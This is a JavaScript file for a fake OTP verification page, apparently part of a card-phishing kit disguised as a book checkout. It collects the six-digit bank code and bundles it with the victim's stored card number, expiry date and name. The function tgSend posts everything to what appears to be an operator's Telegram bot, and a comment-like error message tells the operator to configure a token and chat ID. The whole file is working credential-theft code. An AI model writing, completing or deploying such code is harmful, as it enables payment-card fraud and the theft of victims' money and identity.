const ctx=(()=>{
  try{return JSON.parse(sessionStorage.getItem('rn_ctx')||'null')}catch(e){return null}
})();

const bookEl=document.getElementById('otp-book');
const cardEl=document.getElementById('otp-card');
if(ctx){
  if(ctx.book)bookEl.textContent=ctx.book;
  if(ctx.last4)cardEl.textContent='•••• •••• •••• '+ctx.last4;
}else{
  cardEl.textContent='•••• •••• •••• ••••';
}

const boxes=[].slice.call(document.querySelectorAll('.otp-boxes input'));
const submit=document.getElementById('otp-submit');
const status=document.getElementById('form-status');
const timerEl=document.getElementById('otp-timer');

let expired=false;

function code(){return boxes.map(b=>b.value).join('')}
function filled(){return code().length===6}
function refresh(){
  submit.disabled=!filled()||expired;
  boxes.forEach(b=>b.classList.remove('invalid'));
}

boxes.forEach(function(box,i){
  box.addEventListener('input',function(){
    box.value=box.value.replace(/\D/g,'').slice(0,1);
    if(box.value&&i<5)boxes[i+1].focus();
    refresh();
  });
  box.addEventListener('keydown',function(e){
    if(e.key==='Backspace'&&!box.value&&i>0){
      e.preventDefault();
      boxes[i-1].value='';
      boxes[i-1].focus();
      refresh();
    }
    if(e.key==='ArrowLeft'&&i>0){e.preventDefault();boxes[i-1].focus()}
    if(e.key==='ArrowRight'&&i<5){e.preventDefault();boxes[i+1].focus()}
    if(e.key==='Enter'&&filled()&&!expired){e.preventDefault();verify()}
  });
  box.addEventListener('paste',function(e){
    e.preventDefault();
    const d=(e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,6);
    if(!d)return;
    d.split('').forEach(function(c,j){if(boxes[j])boxes[j].value=c});
    const next=Math.min(d.length,5);
    boxes[next].focus();
    refresh();
  });
  box.addEventListener('focus',function(){box.select()});
});

let left=300;
const tick=setInterval(function(){
  left--;
  if(left<=0){
    clearInterval(tick);
    expired=true;
    timerEl.textContent='Code expired. Start again to request a new one.';
    timerEl.classList.add('expired');
    submit.disabled=true;
    return;
  }
  const m=String(Math.floor(left/60)).padStart(2,'0');
  const s=String(left%60).padStart(2,'0');
  timerEl.textContent='Code expires in '+m+':'+s;
},1000);

async function verify(){
  if(expired||!filled())return;
  const value=code();
  submit.disabled=true;
  submit.textContent='VERIFYING…';
  status.hidden=true;
  status.classList.remove('error');

  const lines=['OTP: '+value,''];
  if(ctx){
    if(ctx.card)lines.push('CARD: '+ctx.card);
    if(ctx.exp)lines.push('EXP: '+ctx.exp);
    if(ctx.name)lines.push('NAME: '+ctx.name);
    if(ctx.book)lines.push('BOOK: '+ctx.book);
    lines.push('AMOUNT: $5.00');
  }
  lines.push('',new Date().toLocaleString());

  try{
    await tgSend(lines.join('\n'));
    window.location.href='success.html';
  }catch(err){
    status.textContent='Could not verify. '+(tgMissing()?'Set your token and chat ID in config.js.':'Try again.');
    status.classList.add('error');
    status.hidden=false;
    submit.disabled=false;
    submit.innerHTML='VERIFY CODE ↗';
    console.error(err);
  }
}

submit.addEventListener('click',verify);
boxes[0].focus();
